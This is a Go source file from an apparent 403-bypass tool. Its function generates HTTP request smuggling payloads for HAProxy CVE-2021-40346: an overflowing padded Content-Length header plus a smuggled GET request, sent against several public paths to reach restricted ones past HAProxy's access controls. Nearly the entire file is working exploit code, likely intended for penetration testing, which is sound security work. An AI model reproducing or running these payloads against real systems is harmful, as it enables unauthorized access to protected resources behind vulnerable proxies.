package payload

import (
	"fmt"
	"strings"

	"github.com/slicingmelon/go-rawurlparser"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
)

// https://github.com/donky16/CVE-2021-40346-POC

/*
GenerateHAProxyBypassPayloads generates payloads for exploiting the HAProxy CVE-2021-40346
integer overflow vulnerability that leads to HTTP Request Smuggling.

The vulnerability exploits an integer overflow in HAProxy's header parsing to smuggle an HTTP
request. By using a malformed Content-Length header that causes integer overflow, we can
smuggle a second request in the body of the first that will be processed by the backend server
but will bypass HAProxy's access controls.

References:
- https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/
- https://github.com/donky16/CVE-2021-40346-POC
*/
func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL: %s", targetURL)
		return allJobs
	}

	// Extract target host and path
	host := parsedURL.Host
	path := parsedURL.Path
	if parsedURL.Query != "" {
		path += "?" + parsedURL.Query
	}

	// We'll test various public endpoints before the restricted one
	publicPaths := []string{
		"/",
		"/robots.txt",
		"/index",
		"/guest",
	}

	// Generate overflow pattern - using the exact pattern from the PoC
	// 217 'a' characters is what's used in the public exploits
	overflowPattern := "0" + strings.Repeat("a", 217)

	// For each public path, try to smuggle a request to the target path
	for _, publicPath := range publicPaths {
		// Craft the smuggled request
		smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nh:GET %s HTTP/1.1\r\nHost: %s\r\n",
			path, publicPath, host)

		// Properly calculate the content length dynamically:
		// First line + "h:G" which is necessary for the request smuggling technique
		firstLine := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
		contentLength := len(firstLine) + 3 // +3 for "h:G"

		// Create payload with dynamically calculated Content-Length
		job := BypassPayload{
			OriginalURL:  targetURL,
			Method:       "POST",
			Scheme:       parsedURL.Scheme,
			Host:         host,
			RawURI:       publicPath,
			BypassModule: bypassModule,
			Body:         smuggledRequest,
			Headers: []Headers{
				{
					Header: "Content-Length" + overflowPattern + ":", // Note the colon at the end
					Value:  "0",
				},
				{
					Header: "Content-Length",
					Value:  fmt.Sprintf("%d", contentLength), // Dynamically calculated
				},
			},
		}

		job.PayloadToken = GeneratePayloadToken(job)
		allJobs = append(allJobs, job)
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payload(s) for %s", len(allJobs), targetURL)
	return allJobs
}
